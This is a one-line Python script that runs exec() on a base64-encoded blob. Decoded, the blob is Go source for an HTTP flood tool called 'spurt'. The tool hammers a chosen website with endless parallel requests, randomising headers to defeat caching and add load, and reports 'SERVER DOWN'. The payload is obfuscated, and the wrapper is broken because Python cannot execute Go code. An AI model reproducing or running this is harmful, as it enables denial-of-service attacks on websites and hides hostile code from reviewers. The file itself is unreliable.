import base64
exec(base64.b64decode('Ly8gc3B1cnQKcGFja2FnZSBtYWluCgppbXBvcnQgKAoJImZsYWciCgkiZm10IgoJImlvIgoJIm1hdGgvcmFuZCIKCSJuZXQvaHR0cCIKCSJvcyIKCSJvcy9zaWduYWwiCgkic3RyaW5ncyIKCSJzeW5jL2F0b21pYyIKCSJzeXNjYWxsIgoJInRpbWUiCgoJImdpdGh1Yi5jb20vYnVwdG1pYW8vcGFyYWxsZWwiCgkiZ2l0aHViLmNvbS9jb3JwaXgvdWFyYW5kIgoJImdpdGh1Yi5jb20vZ29va2l0L2NvbG9yIgopCgp2YXIgKAoJdmVyc2lvbiA9ICJ2MS4zLjAiCgoJYmFubmVyID0gZm10LlNwcmludGYoYAogIF9fX19fICAgICAgICAgICAgICAgICAgIF9fX18gICAgICBfICAgICAgICAgICAKIHxfICAgX3xfIF8gXyBfXyAgX19fX19fX3wgIF8gXCAgX198IHwgX19fICBfX18gCiAgIHwgfC8gX2AgfCAnXyBcfF8gIC9fICAvIHwgfCB8LyBfYCB8LyBfIFwvIF9ffAogICB8IHwgKF98IHwgfCB8IHwvIC8gLyAvfCB8X3wgfCAoX3wgfCAoXykgXF9fIFwKICAgfF98XF9fLF98X3wgfF8vX19fL19fX3xfX19fLyBcX18sX3xcX19fL3xfX18vCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAgKyB2ZXJzaW9uKQoKCXJlZmVycmVycyA9IFtdc3RyaW5newoJCSJodHRwczovL3d3dy5nb29nbGUuY29tLz9xPSIsCgkJImh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8iLAoJCSJodHRwczovL2hlbHAuYmFpZHUuY29tL3NlYXJjaFJlc3VsdD9rZXl3b3Jkcz0iLAoJCSJodHRwczovL3N0ZWFtY29tbXVuaXR5LmNvbS9tYXJrZXQvc2VhcmNoP3E9IiwKCQkiaHR0cHM6Ly93d3cueW91dHViZS5jb20vIiwKCQkiaHR0cHM6Ly93d3cuYmluZy5jb20vc2VhcmNoP3E9IiwKCQkiaHR0cHM6Ly9yLnNlYXJjaC55YWhvby5jb20vIiwKCQkiaHR0cHM6Ly93d3cudGVkLmNvbS9zZWFyY2g/cT0iLAoJCSJodHRwczovL3BsYXkuZ29vZ2xlLmNvbS9zdG9yZS9zZWFyY2g/cT0iLAoJCSJodHRwczovL3ZrLmNvbS9wcm9maWxlLnBocD9hdXRvPSIsCgkJImh0dHBzOi8vd3d3LnVzYXRvZGF5LmNvbS9zZWFyY2gvcmVzdWx0cz9xPSIsCgl9Cglob3N0bmFtZSAgICBzdHJpbmcKCXBhcmFtSm9pbmVyIHN0cmluZwoJcmVxQ291bnQgICAgdWludDY0Cgl0aHJlYWRzICAgICBpbnQKCWNoZWNrICAgICAgIGJvb2wKKQoKZnVuYyBidWlsZGJsb2NrKHNpemUgaW50KSAocyBzdHJpbmcpIHsKCXZhciBhIFtdcnVuZQoJZm9yIGkgOj0gMDsgaSA8IHNpemU7IGkrKyB7CgkJYSA9IGFwcGVuZChhLCBydW5lKHJhbmQuSW50bigyNSkrNjUpKQoJfQoJcmV0dXJuIHN0cmluZyhhKQp9CgpmdW5jIGZldGNoSVAoKSB7CglpcCwgZXJyIDo9IGh0dHAuR2V0KCJodHRwczovL2lwaW5mby50dy8iKQoJaWYgZXJyICE9IG5pbCB7CgkJZm10LlByaW50bG4oZXJyKQoJCXJldHVybgoJfQoJZGVmZXIgaXAuQm9keS5DbG9zZSgpCglib2R5LCBlcnIgOj0gaW8uUmVhZEFsbChpcC5Cb2R5KQoJaWYgZXJyICE9IG5pbCB7CgkJZm10LlByaW50bG4oZXJyKQoJCXJldHVybgoJfQoJZm10LlByaW50ZigiXG4lc1xuIiwgYm9keSkKfQoKZnVuYyBnZXQoKSB7CglpZiBzdHJpbmdzLkNvbnRhaW5zUnVuZShob3N0bmFtZSwgJz8nKSB7CgkJcGFyYW1Kb2luZXIgPSAiJiIKCX0gZWxzZSB7CgkJcGFyYW1Kb2luZXIgPSAiPyIKCX0KCgljIDo9IGh0dHAuQ2xpZW50ewoJCVRpbWVvdXQ6IDM1MDAgKiB0aW1lLk1pbGxpc2Vjb25kLAoJfQoKCXJlcSwgZXJyIDo9IGh0dHAuTmV3UmVxdWVzdCgiR0VUIiwgaG9zdG5hbWUrcGFyYW1Kb2luZXIrYnVpbGRibG9jayhyYW5kLkludG4oNykrMykrIj0iK2J1aWxkYmxvY2socmFuZC5JbnRuKDcpKzMpLCBuaWwpCglpZiBlcnIgIT0gbmlsIHsKCQlmbXQuUHJpbnRsbihlcnIpCgl9CgoJcmVxLkhlYWRlci5TZXQoIlVzZXItQWdlbnQiLCB1YXJhbmQuR2V0UmFuZG9tKCkpCglyZXEuSGVhZGVyLkFkZCgiUHJhZ21hIiwgIm5vLWNhY2hlIikgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gdXNlZCBpbiBjYXNlIGh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL2VuLVVTL2RvY3MvV2ViL0hUVFAvSGVhZGVycy9QcmFnbWEKCXJlcS5IZWFkZXIuQWRkKCJDYWNoZS1Db250cm9sIiwgIm5vLXN0b3JlLCBuby1jYWNoZSIpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBjcmVhdGVzIG1vcmUgbG9hZCBvbiB3ZWIgc2VydmVyCglyZXEuSGVhZGVyLlNldCgiUmVmZXJlciIsIHJlZmVycmVyc1tyYW5kLkludG4obGVuKHJlZmVycmVycykpXStidWlsZGJsb2NrKHJhbmQuSW50big1KSs1KSkgLy8gdXNlcyByYW5kb20gcmVmZXJlciBmcm9tIGxpc3QKCXJlcS5IZWFkZXIuU2V0KCJLZWVwLUFsaXZlIiwgZm10LlNwcmludGYoIiVkIiwgcmFuZC5JbnRuKDEwKSsxMDApKQoJcmVxLkhlYWRlci5TZXQoIkNvbm5lY3Rpb24iLCAia2VlcC1hbGl2ZSIpCgoJcmVzcCwgZXJyIDo9IGMuRG8ocmVxKQoKCWF0b21pYy5BZGRVaW50NjQoJnJlcUNvdW50LCAxKSAvLyBpbmNyZW1lbnQKCglpZiBvcy5Jc1RpbWVvdXQoZXJyKSB7CgkJY29sb3IuUmVkLlByaW50bG4oIlNFUlZFUiBET1dOIikKCX0gZWxzZSB7CgkJY29sb3IuR3JlZW4uUHJpbnRsbigiQVRUQUNLIFRPIFdFQlNJVEUiKQoJfQoKCWlmIGVyciAhPSBuaWwgewoJCXJldHVybgoJfQoKCWRlZmVyIHJlc3AuQm9keS5DbG9zZSgpCn0KCmZ1bmMgbG9vcCgpIHsKCWZvciB7CgkJZ28gZ2V0KCkKCQl0aW1lLlNsZWVwKDEgKiB0aW1lLk1pbGxpc2Vjb25kKSAvLyBzbGVlcCBiZWZvcmUgc2VuZGluZyByZXF1ZXN0IGFnYWluCgl9Cn0KCmZ1bmMgbWFpbigpIHsKCWNvbG9yLkN5YW4uUHJpbnRsbihiYW5uZXIpCgljb2xvci5DeWFuLlByaW50bG4oIlxuXHRcdGdpdGh1Yi5jb20vemVyLWZhclxuIikKCglmbGFnLlN0cmluZ1ZhcigmaG9zdG5hbWUsICJob3N0bmFtZSIsICIiLCAiZXhhbXBsZTogLS1ob3N0bmFtZSBodHRwczovL2V4YW1wbGUuY29tIikKCWZsYWcuSW50VmFyKCZ0aHJlYWRzLCAidGhyZWFkcyIsIDEsICJOdW1iZXIgb2YgdGhyZWFkcyIpCglmbGFnLkJvb2xWYXIoJmNoZWNrLCAiY2hlY2siLCBmYWxzZSwgIkVuYWJsZSBJUCBhZGRyZXNzIGNoZWNrIikKCWZsYWcuUGFyc2UoKQoKCWlmIGNoZWNrIHsKCQlmZXRjaElQKCkKCX0KCglpZiBsZW4oaG9zdG5hbWUpID09IDAgewoJCWNvbG9yLlJlZC5QcmludGxuKCJNaXNzaW5nIGhvc3RuYW1lLiIpCgkJY29sb3IuQmx1ZS5QcmludGxuKCJFeGFtcGxlIHVzYWdlOlxuXHQgLi9zcHVydCAtLWhvc3RuYW1lIGh0dHBzOi8vZXhhbXBsZS5jb20iKQoJCW9zLkV4aXQoMSkKCX0KCglpZiB0aHJlYWRzID09IDAgewoJCWZtdC5QcmludGxuKCJOdW1iZXIgb2YgdGhyZWFkcyBtdXN0IGJlIGdyZWF0ZXIgdGhhbiAwLiIpCgkJb3MuRXhpdCgxKQoJfQoKCWNvbG9yLlllbGxvdy5QcmludGxuKCJQcmVzcyBjb250cm9sK2MgdG8gc3RvcCIpCgl0aW1lLlNsZWVwKDIgKiB0aW1lLlNlY29uZCkKCglzdGFydCA6PSB0aW1lLk5vdygpCgoJYyA6PSBtYWtlKGNoYW4gb3MuU2lnbmFsLCAxKQoJc2lnbmFsLk5vdGlmeShjLCBvcy5JbnRlcnJ1cHQsIHN5c2NhbGwuU0lHVEVSTSkKCWdvIGZ1bmMoKSB7CgkJPC1jCgkJY29sb3IuQmx1ZS5QcmludGxuKCJcbkF0dGVtcHRlZCB0byBzZW5kIiwgcmVxQ291bnQsICJyZXF1ZXN0cyBpbiIsIHRpbWUuU2luY2Uoc3RhcnQpKSAvLyBwcmludCB3aGVuIGNvbnRyb2wrYyBpcyBwcmVzc2VkCgkJb3MuRXhpdCgwKQoJfSgpCgoJcCA6PSBwYXJhbGxlbC5OZXdQYXJhbGxlbCgpIC8vIHJ1bnMgZnVuY3Rpb24gaW4gcGFyYWxsZWwKCWZvciBpIDo9IDA7IGkgPCB0aHJlYWRzOyBpKysgewoJCXAuUmVnaXN0ZXIobG9vcCkKCX0KCXAuUnVuKCkKfQo='))